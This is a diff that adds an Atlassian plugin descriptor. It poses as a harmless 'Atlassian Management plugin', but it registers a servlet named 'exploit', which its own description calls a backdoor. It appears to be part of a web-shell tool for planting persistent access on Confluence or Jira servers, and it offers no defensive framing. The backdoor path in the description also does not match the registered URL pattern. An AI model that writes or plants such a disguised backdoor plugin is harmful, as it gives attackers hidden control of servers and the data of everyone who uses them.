@@ -1,0 +1,14 @@
+<atlassian-plugin key="com.cdl.shell.exp" name="Atlassian Manager" plugins-version="2" class="com.cdl.shell.exp">
+    <plugin-info>
+        <param name="atlassian-data-center-compatible">true</param>
+        <description>Atlassian Management plugin</description>
+        <version>1.0.0</version>
+    </plugin-info>
+
+	<servlet name="exploit" key="exploit" class="com.cdl.shell.exp">
+	   <url-pattern>/exp</url-pattern>
+	   <description>backdoor at /plugins/servlet/cdl</description>
+	</servlet>
+
+</atlassian-plugin>
+
